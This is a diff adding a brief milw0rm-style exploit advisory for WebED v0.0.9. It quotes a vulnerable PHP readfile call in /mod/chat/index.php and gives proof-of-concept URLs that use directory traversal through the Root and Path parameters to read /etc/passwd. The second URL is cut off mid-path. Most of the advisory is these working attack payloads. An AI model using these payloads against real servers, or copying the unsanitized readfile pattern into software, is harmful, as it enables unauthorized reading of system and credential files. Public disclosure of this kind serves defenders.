@@ -1,0 +1,11 @@
+WebED v0.0.9 (index.php) Remote File Disclosure Vulnerabilities
+Script : http://heanet.dl.sourceforge.net/sourceforge/ed-engine/WebED_v0.0.9.tar.gz
+Vuln Code In /mod/chat/index.php :
+<body>
+ <?php readfile($Root.$Path); ?> <---[xxx]
+ <form action="application_loader.php" method="post">
+PoC :
+     /mod/chat/index.php?Root=../../../../../../etc/passwd
+     /mod/chat/index.php?Path=../../../../../../etc/pa
+
+# milw0rm.com [2007-11-29]
